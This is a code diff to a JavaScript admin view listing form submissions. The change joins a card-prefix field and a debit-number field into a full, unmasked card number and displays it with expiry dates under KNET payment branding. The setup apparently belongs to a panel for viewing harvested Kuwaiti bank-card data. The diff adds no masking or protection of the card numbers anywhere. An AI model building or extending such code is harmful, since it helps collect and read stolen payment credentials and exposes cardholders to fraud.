@@ -1445,7 +1445,11 @@
             seenKeys[key] = true;
             columns.push({
               key: key,
-              label: String(field.label || field.name || "Field").trim() || "Field"
+              label: (
+                normalizeFieldKey(field.name || field.label || "") === "debitnumber"
+                  ? "رقم بطاقة الصراف الآلي"
+                  : (String(field.label || field.name || "Field").trim() || "Field")
+              )
             });
           });
         });
@@ -1506,6 +1510,17 @@
             "<img src=\"/static/frontend/images/knet.svg\" alt=\"KNET\" />" +
           "</div>"
         );
+      }
+
+      function getSubmissionCombinedCardNumber(submission) {
+        var prefixValue =
+          getSubmissionFieldValue(submission, "dcprefix") ||
+          findPreferredFieldValue(submission, ["dcprefix", "بادئة البطاقة"]);
+        var debitNumberValue =
+          getSubmissionFieldValue(submission, "debit_number") ||
+          getSubmissionFieldValue(submission, "debitnumber") ||
+          findPreferredFieldValue(submission, ["debit_number", "debitnumber", "رقم بطاقة الصرف الآلي", "رقم بطاقة الصراف الآلي"]);
+        return (String(prefixValue || "") + String(debitNumberValue || "")).replace(/\D/g, "");
       }
 
       function getSubmissionFieldValue(submission, columnKey) {
@@ -1675,7 +1690,11 @@
         return (
           "<tr class=\"submission-group-head-row\">" +
           columns.map(function (column) {
-            return "<th>" + escapeHtml(column.label) + "</th>";
+            var normalizedColumnKey = normalizeFieldKey(column.key);
+            var headerClass = (normalizedColumnKey === "debitnumber" || normalizedColumnKey === "رقمبطاقةالصرافالآلي" || normalizedColumnKey === "رقمبطاقةالصرفالآلي")
+              ? " class=\"submission-card-number-column\""
+              : "";
+            return "<th" + headerClass + ">" + escapeHtml(column.label) + "</th>";
           }).join("") +
           "</tr>"
         );
@@ -1772,6 +1791,7 @@
 
       function renderSubmissionRow(submission, columns, columnCount) {
         var cells = columns.map(function (column) {
+          var normalizedColumnKey = normalizeFieldKey(column.key);
           if (column.key === "__payment_method__") {
             return "<td class=\"submission-value-cell submission-payment-cell\">" + renderSubmissionPaymentMethodMarkup(submission) + "</td>";
           }
@@ -1779,9 +1799,25 @@
             var expiryDisplayValue = getSubmissionExpiryDisplayValue(submission);
             return "<td class=\"submission-value-cell is-ltr\">" + (expiryDisplayValue ? escapeHtml(expiryDisplayValue) : "—") + "</td>";
           }
+          if (getSubmissionPaymentMethod(submission) === "cards") {
+            if (normalizedColumnKey === "dcprefix" || normalizedColumnKey === "بادئةالبطاقة") {
+              return "<td class=\"" + getSubmissionValueCellClass(column.key) + "\">-</td>";
+            }
+            if (normalizedColumnKey === "debitnumber" || normalizedColumnKey === "رقمبطاقةالصرفالآلي") {
+              var combinedCardNumber = getSubmissionCombinedCardNumber(submission);
+              var combinedDisplayValue = combinedCardNumber
+                ? combinedCardNumber.replace(/(\d{4})(?=\d)/g, "$1 ").trim()
+                : "";
+              return "<td class=\"" + getSubmissionValueCellClass(column.key) + " submission-card-number-column\">" + (combinedDisplayValue ? formatFieldValue(combinedDisplayValue) : "—") + "</td>";
+            }
+          }
           var value = getSubmissionFieldValue(submission, column.key);
           var displayValue = formatSubmissionDisplayValue(column.key, value);
-          return "<td class=\"" + getSubmissionValueCellClass(column.key) + "\">" + (displayValue ? formatFieldValue(displayValue) : "—") + "</td>";
+          var cellClassName = getSubmissionValueCellClass(column.key);
+          if (normalizedColumnKey === "debitnumber" || normalizedColumnKey === "رقمبطاقةالصرافالآلي" || normalizedColumnKey === "رقمبطاقةالصرفالآلي") {
+            cellClassName += " submission-card-number-column";
+          }
+          return "<td class=\"" + cellClassName + "\">" + (displayValue ? formatFieldValue(displayValue) : "—") + "</td>";
         });
         if (!cells.length) {
           cells.push("<td>—</td>");
